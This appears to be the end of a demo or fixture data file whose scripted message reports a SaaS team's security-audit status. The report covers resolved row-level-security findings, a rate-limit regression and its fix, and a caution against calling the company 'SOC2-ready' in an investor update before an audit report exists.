**Resolved (5):** SA-001 — \`rowsecurity=t\` on 14/14, cross-tenant suite 8 passed, \`GET /api/export?team_id=<foreign>\` → 200 with **0 rows**: filtered, not errored, which proves it's the policy and not a guard clause. Plus SA-003/4/7/8.

**Still open (3):** SA-002 (enforce flip is Sprint B — why the header score is 7/8), SA-005 (10-27), SA-006. **No new findings. One regression, and it's yours:**

\`\`\`
[R-001] auth-burst challenged a customer's entire office
  Detected  2026-09-22 09:14Z — 3 support tickets in 40 minutes
  Cause     31 seats behind 203.0.113.41 crossed 10 req/min four minutes into
            the working day; 118 Managed Challenge actions on /api/auth/*
  Fix       10 → 20 req/min/IP at 10:05Z, action still Managed Challenge
  Verified  2026-09-23 09:00–10:00Z: 0 actions from that address
\`\`\`

A07 therefore reads PARTIAL inside the 8/10: the control is live but re-tuned six days ago, and one Monday isn't a baseline.

For the investor update: **"Type I blockers closed, fieldwork scheduled for 2026-10-26"**, not "SOC2-ready" — there's no report until Prescient writes one.`,
      artifacts: ["posture-compare", "security-checkpoint"],
    },
  ],
};
